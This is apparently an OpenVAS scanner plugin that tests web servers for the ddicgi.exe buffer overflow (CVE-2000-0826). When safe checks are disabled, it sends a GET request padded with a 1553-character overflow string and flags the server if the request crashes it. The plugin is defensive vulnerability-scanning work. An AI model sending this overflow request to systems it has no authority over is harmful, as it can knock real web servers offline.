# OpenVAS Vulnerability Test
# $Id: ddicgi.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: ddicgi.exe vulnerability
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2003 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The file ddicgi.exe exists on this webserver.  
Some versions of this file are vulnerable to remote exploit.

An attacker may use this file to gain access to confidential data
or escalate their privileges on the Web server.";

tag_solution = "remove it from the cgi-bin or scripts directory.";

if(description)
{
 script_id(11728);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1657);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2000-0826");
 
 
 name = "ddicgi.exe vulnerability";
 script_name(name);
 


 
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2003 John Lampe");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(is_cgi_installed_ka(item:"/ddrint/bin/ddicgi.exe", port:port))
{
  if (safe_checks() == 0) {
	if(http_is_dead(port:port))exit(0);
	req = string("GET /ddrint/bin/ddicgi.exe?", crap(1553), "=X HTTP/1.0\r\n\r\n");
	soc = open_sock_tcp(port);
	if (soc) {
		send(socket:soc, data:req);
		r = http_recv(socket:soc);
		close(soc);
		if(http_is_dead(port:port)){ security_message(port); exit(0); }
	}
	exit(0);
   }
}

